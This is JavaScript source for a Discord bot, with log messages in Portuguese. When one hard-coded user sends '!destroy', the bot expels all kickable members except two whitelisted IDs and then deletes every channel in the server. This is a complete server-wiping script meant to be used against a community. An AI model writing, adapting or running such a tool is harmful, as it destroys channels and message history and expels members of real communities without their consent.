const Discord = require('discord.js');
const client = new Discord.Client({ intents: ["GUILDS", "GUILD_MESSAGES", "GUILD_MESSAGE_REACTIONS", "GUILD_MEMBERS", "GUILD_PRESENCES"] });
client.on('ready', readyDiscord);
client.on('messageCreate', gotMessage);

function readyDiscord(){
  console.log('Bot rodando');
}

function gotMessage(msg){
  if(!msg.author.bot && msg.content == '!destroy'){
    var idss = ['467543999999282816', '467543699999982816'];
    if(msg.member.id == '467599999917282816'){
      var list = client.guilds.cache.get(msg.guild.id);
      list.members.cache.each(member => {
        if(member){
          if(member.kickable && !idss.includes(member.id)){
            console.log('Membro expulso: ' + member.user.username);
            member.kick();
          }else{
            console.log('Não foi possível expulsar: ' + member.user.username);
          }
        }
      });
      list = client.guilds.cache.get(msg.guild.id);
      list.channels.cache.each(channel => {
        if(channel){
          channel.delete();
          console.log('Canal deletado: ' + channel.name);
        }
      });
    }
  }
}

client.login('TOKEN AQUI');
